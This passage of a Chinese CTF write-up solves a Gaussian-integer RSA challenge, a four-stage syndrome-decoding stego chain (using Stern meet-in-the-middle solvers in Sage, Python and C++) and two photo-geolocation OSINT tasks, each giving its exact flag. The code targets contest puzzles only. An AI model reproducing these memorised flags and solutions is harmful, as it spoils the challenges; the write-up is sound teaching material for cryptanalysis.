if Mr % BASE != S[0] or Mi % BASE != S[1]:
    continue
```

最后将两个部分按照小端转回 bytes：

```text
real = int(Mr).to_bytes(half, 'little')
imag = int(Mi).to_bytes(half, 'little')
flag = real + imag
```

并用 flag 格式筛选：

```text
if flag.startswith(b'H&NCTF{') and flag.endswith(b'}'):
    print(flag)
```

即可得到唯一候选。

**solve\.sage**

```python
"""

[+] factor Norm(N) = 315251866387752868275572700381099631229 * 337608685368087429339298615454500394669
[+] residue R = (-194576725514947870360899698428091409334, 67381525646482856392856838673146002332)
[+] searching u in [-39231, -38857]
[+] candidate: b'H&NCTF{y0u_kn0w_gaussian_rsa_pr0max}'
H&NCTF{y0u_kn0w_gaussian_rsa_pr0max}"""from sage.all import *

# parameters copied from chal.sage output
e = 65537
BASE = 256
K = 16
half = K + 2
S = (72, 117)
P = (97, 125)
N = (-285076339391714133886998989405561241005,
     -158629281313461832934731017808709616276)
C = (43768499594212098138374344295509835882,
     25834506882323987292031095052053291634)


def gi(a, b=0): return (ZZ(a), ZZ(b))
def gadd(x, y): return (x[0] + y[0], x[1] + y[1])
def gsub(x, y): return (x[0] - y[0], x[1] - y[1])
def gmul(x, y): return (x[0]*y[0] - x[1]*y[1], x[0]*y[1] + x[1]*y[0])
def gnorm(x): return x[0]*x[0] + x[1]*x[1]
def nearest_div(num, den): return ZZ(floor(QQ(num)/QQ(den) + QQ(1)/QQ(2)))
def gaussian_divmod(x, y):
    den = gnorm(y)
    qr = nearest_div(x[0]*y[0] + x[1]*y[1], den)
    qi = nearest_div(x[1]*y[0] - x[0]*y[1], den)
    q = (qr, qi)
    return q, gsub(x, gmul(q, y))
def gaussian_mod(x, n): return gaussian_divmod(x, n)[1]
def gaussian_mulmod(x, y, n): return gaussian_mod(gmul(x, y), n)
def gaussian_powmod(x, ee, n):
    x = gaussian_mod(x, n)
    res = gi(1, 0)
    while ee:
        if ee & 1:
            res = gaussian_mulmod(res, x, n)
        x = gaussian_mulmod(x, x, n)
        ee >>= 1
    return res

def ceil_div(a, b):
    return -((-ZZ(a)) // ZZ(b))

def floor_div(a, b):
    return ZZ(a) // ZZ(b)

def add_ineq_for_v(lo, hi, const, coef):
    # lo <= const + coef*v < hi
    lo, hi, const, coef = map(ZZ, (lo, hi, const, coef))
    if coef > 0:
        return ceil_div(lo - const, coef), floor_div(hi - 1 - const, coef)
    else:
        return ceil_div(hi - 1 - const, coef), floor_div(lo - const, coef)

# 1) Gaussian RSA 的 phi 来自两个 rational norm primes: Norm(N)=np*nq
normN = gnorm(N)
fac = factor(normN)
print('[+] factor Norm(N) =', fac)
pr = [ZZ(p) for p, ee in fac for _ in range(ee)]
assert len(pr) == 2
np, nq = pr
phi = lcm(np - 1, nq - 1)
d = inverse_mod(e, phi)

# 2) decrypt only gets M mod N, because chal has assert gnorm(M) > gnorm(N)
R = gaussian_powmod(C, d, N)
print('[+] residue R =', R)

# 3) recover M = R + (u+vi)N from known first/last bytes.
# real part first half starts with S[0] and ends with P[0]
# imag part second half starts with S[1] and ends with P[1]
B17 = ZZ(BASE) ** (half - 1)
Lr, Ur = ZZ(P[0]) * B17, ZZ(P[0] + 1) * B17
Li, Ui = ZZ(P[1]) * B17, ZZ(P[1] + 1) * B17
Nr, Ni = map(ZZ, N)
Rr, Ri = map(ZZ, R)

# Estimate u range by mapping the four rectangle corners back through multiplication by N^{-1}
def uv_from_xy(x, y):
    x -= Rr
    y -= Ri
    den = normN
    uu = QQ(x*Nr + y*Ni) / QQ(den)
    vv = QQ(-x*Ni + y*Nr) / QQ(den)
    return uu, vv
corners = [uv_from_xy(x, y) for x in (Lr, Ur-1) for y in (Li, Ui-1)]
umin = floor(min(u for u, v in corners)) - 5
umax = ceil(max(u for u, v in corners)) + 5
print(f'[+] searching u in [{umin}, {umax}]')

cands = []
for u in range(ZZ(umin), ZZ(umax) + 1):
    # M_r = Rr + u*Nr - v*Ni ; M_i = Ri + u*Ni + v*Nr
    v1_lo, v1_hi = add_ineq_for_v(Lr, Ur, Rr + u*Nr, -Ni)
    v2_lo, v2_hi = add_ineq_for_v(Li, Ui, Ri + u*Ni, Nr)
    vlo, vhi = max(v1_lo, v2_lo), min(v1_hi, v2_hi)
    if vlo > vhi:
        continue
    for v in range(vlo, vhi + 1):
        Mr = Rr + u*Nr - v*Ni
        Mi = Ri + u*Ni + v*Nr
        if Mr % BASE != S[0] or Mi % BASE != S[1]:
            continue
        real = int(Mr).to_bytes(half, 'little')
        imag = int(Mi).to_bytes(half, 'little')
        flag = real + imag
        if flag.startswith(b'H&NCTF{') and flag.endswith(b'}'):
            cands.append((u, v, flag))
            print('[+] candidate:', flag)

assert cands, 'no candidate found; check copied parameters'
print(cands[0][2].decode())
"""
[+] factor Norm(N) = 315251866387752868275572700381099631229 * 337608685368087429339298615454500394669
[+] residue R = (-194576725514947870360899698428091409334, 67381525646482856392856838673146002332)
[+] searching u in [-39231, -38857]
[+] candidate: b'H&NCTF{y0u_kn0w_gaussian_rsa_pr0max}'
H&NCTF{y0u_kn0w_gaussian_rsa_pr0max}
"""
```

![Image](./images/img-115.png)

H\&NCTF\{y0u\_kn0w\_gaussian\_rsa\_pr0max\}



## 题目名称：狗仔的自我养成

解题人：weixiao

解题过程：

先看 `challenge.py`，可以发现这不是普通图片隐写直接读 flag，而是一个多轮 syndrome decoding 链。

图片中最低 bit\-plane 按伪随机位置藏了每一轮的 payload。每一轮 payload 分成两部分：

- 前 `m` bit：一个 syndrome

- 后 `96` bit：下一轮 state 的校验值 `stage_check(state_after)`

每轮参数如下：

|stage|n|m|w|slot\_bits|
|---|---|---|---|---|
|stage\_a|1024|896|72|1280|
|stage\_b|1536|1344|88|1664|
|stage\_c|1536|1344|96|1664|
|stage\_d|2048|1792|128|2304|

每轮都需要找到一个固定重量为 `w` 的 support，使得：

```text
H * e = syndrome
weight(e) = w
```

找到 support 后，用它派生下一轮 state：

```python
state_after = next_state(state, stage, support)
```

再用 payload 中的 96\-bit check 验证：

```python
stage_check(state_after) == next_state_check
```

通过四轮后，最终 state 用 HKDF 派生 AES\-GCM key 解密 flag。

**提取 stage0**

脚本已经提供了提取接口：

```powershell
python .\challenge.py info
python .\challenge.py extract --stage 0
```

stage0 提取结果包含：

- `matrix_seed_hex`

- `syndrome_hex`

- `next_state_check_hex`

后续 stage 的提取依赖上一轮 state，所以必须逐轮解。

**关键思路**

一开始容易被题面中的“照片越糊”带偏，去尝试 bit\-plane 可视化、条码识别、低位隐写、马赛克块统计等方向。

但真正的核心是脚本里的版本名：

```text
mosaic-chain-syndrome-v3
```

题目本质是 4 轮 syndrome decoding。由于 `n - m` 分别只有：

```text
128, 192, 192, 256
```

可以使用 Information Set Decoding / Stern meet\-in\-the\-middle 来求固定重量解，而不是暴力搜索 support。

**Stern / MITM 解码**

对每一轮，把矩阵 `H` 做随机系统形变换，得到类似：

```text
[A | I]
```

设信息位长度为：

```text
k = n - m
```

随机选系统形后，错误向量可以分成两部分：

- 信息位部分，重量为 `p`

- 校验位部分，重量为 `w - p`

Stern 的思路是把信息位再分成左右两半，对左右各枚举一半重量，然后按 syndrome 的低 `ell` bit 做碰撞。

碰撞后得到候选：

```text
y = syndrome ^ left_sum ^ right_sum
```

如果：

```text
weight(y) == w - p
```

就能拼出完整 support。再用原始 syndrome 和 `stage_check` 验证即可。

本题中使用的参数大致是：

|stage|k|常用 p|ell|
|---|---|---|---|
|stage\_a|128|6|16|
|stage\_b|192|6|18|
|stage\_c|192|6|18|
|stage\_d|256|6|20|

前三轮 Python 版可以跑出结果；最后一轮矩阵更大，用 C\+\+ 加速。

我写了两个求解脚本：

- `stern_solve.py`：Python 版 Stern/MITM，适合前几轮

- `stern_cpp.cpp`：C\+\+ 版 Stern/MITM，用来加速最后一轮

- `solve.py`：读取 `supports.json`，逐轮校验 support 并解密 flag

**solve\.py**

```python
import json
from pathlib import Path

import challenge
from PIL import Image

def solve_with_supports(supports):
    img = Image.open(challenge.IMAGE_PATH).convert("RGB")
    states = []
    state = challenge.initial_state()
    for index, support in enumerate(supports):
        stage = challenge.CHALLENGE["stages"][index]
        material = challenge.derive_stage_material(state, stage)
        info = challenge.extract_stage(index, states)
        syndrome = int(info["syndrome_hex"], 16)
        check = bytes.fromhex(info["next_state_check_hex"])
        got = challenge.syndrome_from_support(stage, support, material["matrix_seed"])
        if got != syndrome:
            raise ValueError(f"stage {index}: bad syndrome")
        state = challenge.next_state(state, stage, support)
        if challenge.stage_check(state) != check:
            raise ValueError(f"stage {index}: bad state check")
        print(f"stage {index} ok: {state.hex()}")
        states.append(state)
    print(challenge.decrypt_with_state(states[-1]))

if __name__ == "__main__":
    path = Path("supports.json")
    if not path.exists():
        raise SystemExit("write supports.json as a JSON list of support lists")
    solve_with_supports(json.loads(path.read_text()))

```

**stern\_cpp\.cpp**

```c++
#include <algorithm>
#include <chrono>
#include <cstdint>
#include <fstream>
#include <functional>
#include <iostream>
#include <numeric>
#include <random>
#include <stdexcept>
#include <string>
#include <unordered_map>
#include <utility>
#include <vector>

using u64 = uint64_t;

struct Entry {
    u64 hi[32];
    std::vector<int> combo;
};

static std::vector<u64> read_u64_file(const std::string &path, size_t count) {
    std::ifstream f(path, std::ios::binary);
    if (!f) {
        throw std::runtime_error("open failed: " + path);
    }
    std::vector<u64> out(count);
    f.read(reinterpret_cast<char *>(out.data()), static_cast<std::streamsize>(count * sizeof(u64)));
    if (f.gcount() != static_cast<std::streamsize>(count * sizeof(u64))) {
        throw std::runtime_error("short read: " + path);
    }
    return out;
}

static inline int get_bit(const std::vector<u64> &row, int bit) {
    return static_cast<int>((row[bit >> 6] >> (bit & 63)) & 1ULL);
}

static inline void xor_row(std::vector<u64> &a, const std::vector<u64> &b) {
    for (size_t i = 0; i < a.size(); ++i) {
        a[i] ^= b[i];
    }
}

static int popcount_words(const std::vector<u64> &x) {
    int w = 0;
    for (u64 v : x) {
        w += __builtin_popcountll(v);
    }
    return w;
}

static void mask_last(std::vector<u64> &x, int bits) {
    int rem = bits & 63;
    if (rem) {
        x.back() &= (1ULL << rem) - 1ULL;
    }
}

struct Systematic {
    std::vector<int> pivots;
    std::vector<int> infos;
    std::vector<std::vector<u64>> a_cols;
    std::vector<u64> syn;
};

static bool systematic_form(
    const std::vector<std::vector<u64>> &base_rows,
    int n,
    int m,
    std::mt19937_64 &rng,
    Systematic &out
) {
    const int words_aug = (n + 1 + 63) / 64;
    const int words_m = (m + 63) / 64;
    auto rows = base_rows;
    std::vector<int> perm(n);
    std::iota(perm.begin(), perm.end(), 0);
    std::shuffle(perm.begin(), perm.end(), rng);

    int rank = 0;
    std::vector<int> pivots;
    pivots.reserve(m);
    for (int col : perm) {
        int pivot = -1;
        for (int row = rank; row < m; ++row) {
            if (get_bit(rows[row], col)) {
                pivot = row;
                break;
            }
        }
        if (pivot < 0) {
            continue;
        }
        if (pivot != rank) {
            std::swap(rows[pivot], rows[rank]);
        }
        for (int row = 0; row < m; ++row) {
            if (row != rank && get_bit(rows[row], col)) {
                xor_row(rows[row], rows[rank]);
            }
        }
        pivots.push_back(col);
        ++rank;
        if (rank == m) {
            break;
        }
    }

    if (rank != m) {
        return false;
    }

    std::vector<unsigned char> is_pivot(n, 0);
    for (int col : pivots) {
        is_pivot[col] = 1;
    }
    std::vector<int> infos;
    infos.reserve(n - m);
    for (int col = 0; col < n; ++col) {
        if (!is_pivot[col]) {
            infos.push_back(col);
        }
    }

    std::vector<std::vector<u64>> a_cols(infos.size(), std::vector<u64>(words_m, 0));
    for (size_t idx = 0; idx < infos.size(); ++idx) {
        int col = infos[idx];
        for (int row = 0; row < m; ++row) {
            if (get_bit(rows[row], col)) {
                a_cols[idx][row >> 6] |= 1ULL << (row & 63);
            }
        }
    }

    std::vector<u64> syn(words_m, 0);
    for (int row = 0; row < m; ++row) {
        if (get_bit(rows[row], n)) {
            syn[row >> 6] |= 1ULL << (row & 63);
        }
    }
    mask_last(syn, m);

    out.pivots = std::move(pivots);
    out.infos = std::move(infos);
    out.a_cols = std::move(a_cols);
    out.syn = std::move(syn);
    return true;
}

static void gen_combos(
    const std::vector<std::vector<u64>> &cols,
    int start,
    int stop,
    int choose,
    int pos,
    int next,
    std::vector<int> &combo,
    std::vector<u64> &acc,
    const std::function<void(const std::vector<u64> &, const std::vector<int> &)> &emit
) {
    if (pos == choose) {
        emit(acc, combo);
        return;
    }
    for (int i = next; i <= stop - (choose - pos); ++i) {
        combo[pos] = i;
        for (size_t w = 0; w < acc.size(); ++w) {
            acc[w] ^= cols[i][w];
        }
        gen_combos(cols, start, stop, choose, pos + 1, i + 1, combo, acc, emit);
        for (size_t w = 0; w < acc.size(); ++w) {
            acc[w] ^= cols[i][w];
        }
    }
}

static u64 prefix_key(const std::vector<u64> &x, int ell) {
    if (ell == 0) {
        return 0;
    }
    if (ell >= 64) {
        return x[0];
    }
    return x[0] & ((1ULL << ell) - 1ULL);
}

static bool stern_try(
    const Systematic &sys,
    int m,
    int w,
    int p,
    int ell,
    std::vector<int> &support_out
) {
    const int k = static_cast<int>(sys.infos.size());
    const int mid = k / 2;
    const int p1 = p / 2;
    const int p2 = p - p1;
    const int words_m = (m + 63) / 64;
    if (p1 > mid || p2 > k - mid) {
        return false;
    }

    std::unordered_multimap<u64, Entry> table;
    table.reserve(400000);

    std::vector<int> combo1(p1);
    std::vector<u64> acc1(words_m, 0);
    gen_combos(sys.a_cols, 0, mid, p1, 0, 0, combo1, acc1, [&](const std::vector<u64> &value, const std::vector<int> &combo) {
        Entry e;
        std::fill(std::begin(e.hi), std::end(e.hi), 0);
        for (int i = 0; i < words_m; ++i) {
            e.hi[i] = value[i];
        }
        e.combo = combo;
        table.emplace(prefix_key(value, ell), std::move(e));
    });

    const u64 target_prefix = prefix_key(sys.syn, ell);
    std::vector<int> combo2(p2);
    std::vector<u64> acc2(words_m, 0);
    bool found = false;
    gen_combos(sys.a_cols, mid, k, p2, 0, mid, combo2, acc2, [&](const std::vector<u64> &value2, const std::vector<int> &combo_b) {
        if (found) {
            return;
        }
        u64 key = target_prefix ^ prefix_key(value2, ell);
        auto range = table.equal_range(key);
        for (auto it = range.first; it != range.second; ++it) {
            std::vector<u64> y = sys.syn;
            for (int i = 0; i < words_m; ++i) {
                y[i] ^= it->second.hi[i] ^ value2[i];
            }
            mask_last(y, m);
            if (popcount_words(y) != w - p) {
                continue;
            }
            std::vector<int> support;
            support.reserve(w);
            for (int idx : it->second.combo) {
                support.push_back(sys.infos[idx]);
            }
            for (int idx : combo_b) {
                support.push_back(sys.infos[idx]);
            }
            for (int row = 0; row < m; ++row) {
                if ((y[row >> 6] >> (row & 63)) & 1ULL) {
                    support.push_back(sys.pivots[row]);
                }
            }
            if (static_cast<int>(support.size()) == w) {
                std::sort(support.begin(), support.end());
                support_out = std::move(support);
                found = true;
                return;
            }
        }
    });
    return found;
}

int main(int argc, char **argv) {
    if (argc < 8) {
        std::cerr << "usage: stern_cpp n m w cols.bin syn.bin seed max_forms\n";
        return 2;
    }
    int n = std::stoi(argv[1]);
    int m = std::stoi(argv[2]);
    int w = std::stoi(argv[3]);
    std::string col_path = argv[4];
    std::string syn_path = argv[5];
    uint64_t seed = std::stoull(argv[6]);
    int max_forms = std::stoi(argv[7]);

    int words_m = (m + 63) / 64;
    int words_aug = (n + 1 + 63) / 64;
    auto cols_flat = read_u64_file(col_path, static_cast<size_t>(n) * words_m);
    auto syn = read_u64_file(syn_path, words_m);

    std::vector<std::vector<u64>> rows(m, std::vector<u64>(words_aug, 0));
    for (int col = 0; col < n; ++col) {
        for (int row = 0; row < m; ++row) {
            if ((cols_flat[static_cast<size_t>(col) * words_m + (row >> 6)] >> (row & 63)) & 1ULL) {
                rows[row][col >> 6] |= 1ULL << (col & 63);
            }
        }
    }
    for (int row = 0; row < m; ++row) {
        if ((syn[row >> 6] >> (row & 63)) & 1ULL) {
            rows[row][n >> 6] |= 1ULL << (n & 63);
        }
    }

    std::vector<std::pair<int, int>> params;
    if (n - m <= 128) {
        params = {{0, 0}, {2, 8}, {4, 12}, {6, 16}, {8, 20}};
    } else if (n - m <= 192) {
        params = {{0, 0}, {2, 8}, {4, 13}, {6, 18}};
    } else {
        params = {{0, 0}, {2, 8}, {4, 14}, {6, 20}};
    }

    std::mt19937_64 rng(seed);
    auto start = std::chrono::steady_clock::now();
    for (int form = 1; form <= max_forms; ++form) {
        Systematic sys;
        if (!systematic_form(rows, n, m, rng, sys)) {
            continue;
        }
        for (auto [p, ell] : params) {
            std::vector<int> support;
            if (stern_try(sys, m, w, p, ell, support)) {
                auto now = std::chrono::steady_clock::now();
                double sec = std::chrono::duration<double>(now - start).count();
                std::cerr << "FOUND form=" << form << " p=" << p << " ell=" << ell << " time=" << sec << "\n";
                for (size_t i = 0; i < support.size(); ++i) {
                    if (i) {
                        std::cout << ",";
                    }
                    std::cout << support[i];
                }
                std::cout << "\n";
                return 0;
            }
        }
        if (form % 10 == 0) {
            auto now = std::chrono::steady_clock::now();
            double sec = std::chrono::duration<double>(now - start).count();
            std::cerr << "forms=" << form << " elapsed=" << sec << "\n";
        }
    }
    std::cerr << "not found\n";
    return 1;
}

```

**supports\.json**

```yaml
[[12, 14, 15, 22, 28, 41, 47, 53, 54, 63, 71, 102, 112, 117, 135, 136, 161, 167, 185, 201, 208, 220, 225, 229, 268, 270, 272, 295, 301, 311, 339, 341, 358, 364, 371, 403, 419, 438, 481, 484, 493, 496, 503, 532, 535, 540, 605, 615, 622, 649, 688, 707, 711, 713, 717, 742, 773, 789, 805, 820, 862, 872, 877, 884, 885, 895, 915, 965, 993, 994, 998, 1002], [6, 11, 32, 34, 43, 73, 107, 112, 155, 177, 183, 186, 207, 209, 215, 218, 225, 238, 263, 303, 312, 319, 326, 341, 355, 374, 395, 398, 435, 439, 465, 472, 502, 505, 547, 558, 569, 587, 609, 623, 629, 658, 662, 680, 698, 712, 766, 771, 790, 795, 809, 831, 854, 865, 932, 946, 968, 993, 997, 1005, 1015, 1016, 1025, 1051, 1105, 1128, 1130, 1182, 1204, 1213, 1219, 1231, 1253, 1298, 1301, 1317, 1341, 1344, 1370, 1398, 1403, 1410, 1427, 1451, 1455, 1460, 1466, 1505], [1, 24, 28, 38, 57, 72, 75, 91, 112, 140, 180, 188, 194, 199, 211, 233, 238, 243, 262, 282, 308, 309, 312, 328, 333, 342, 357, 361, 362, 364, 383, 398, 402, 407, 421, 444, 460, 473, 493, 494, 518, 528, 532, 569, 610, 613, 648, 658, 661, 673, 683, 721, 732, 763, 774, 781, 814, 863, 939, 950, 957, 973, 976, 989, 1071, 1098, 1099, 1122, 1167, 1180, 1198, 1236, 1242, 1252, 1258, 1261, 1263, 1266, 1286, 1300, 1304, 1329, 1335, 1356, 1368, 1390, 1412, 1422, 1441, 1458, 1462, 1464, 1469, 1526, 1527, 1532], [20, 43, 71, 78, 92, 105, 119, 128, 134, 135, 136, 178, 246, 257, 271, 278, 293, 295, 305, 323, 332, 349, 351, 355, 385, 413, 426, 486, 498, 571, 613, 615, 616, 625, 631, 634, 638, 648, 665, 699, 703, 706, 708, 731, 765, 772, 776, 788, 804, 820, 848, 852, 856, 884, 907, 922, 933, 946, 956, 964, 989, 1009, 1010, 1040, 1044, 1046, 1085, 1091, 1099, 1101, 1111, 1132, 1136, 1142, 1163, 1169, 1195, 1202, 1213, 1225, 1240, 1272, 1288, 1292, 1336, 1341, 1374, 1395, 1405, 1429, 1456, 1490, 1516, 1541, 1555, 1575, 1617, 1639, 1706, 1708, 1725, 1732, 1813, 1815, 1829, 1834, 1840, 1857, 1864, 1866, 1877, 1882, 1886, 1899, 1904, 1907, 1914, 1939, 1957, 1961, 1976, 1984, 1990, 1992, 2003, 2017, 2024, 2039]]
```

![Image](./images/img-116.png)

H&NCTF{bitplane_calibration_mitm_4way_chain}







# OSINT

## 题目名称：OSINT1

解题人：weixiao

解题思路：

从图里可以看出来海蓝星梦幻城，搜索一下。

![Image](./images/img-117.png)

可以发现全国唯一：

![Image](./images/img-118.png)

高德地图定位到位置即可：

![Image](./images/img-119.png)

> H&NCTF{辽宁省_沈阳市_七星大街_蒲达路}
> 
> 

## 题目名称：OSINT2

解题人：weixiao

解题思路：

百度识图，发现好像是太原发射的卫星：

![Image](./images/img-120.png)

点击图片进链接，发现就是最近几天发射的火箭。

![Image](./images/img-121.png)

确定火箭为长征六号甲：

![Image](./images/img-122.png)

接着就是，找地方了，继续盯真，发现一个地名：`清源水城欢`。

![Image](./images/img-123.png)

高德地图搜索清源水城，发现最近的是东湖公园，尝试提交正确。

![Image](./images/img-124.png)

> H&NCTF{山西省_太原市_清徐县_东湖公园_长征六号甲}
> 
> 
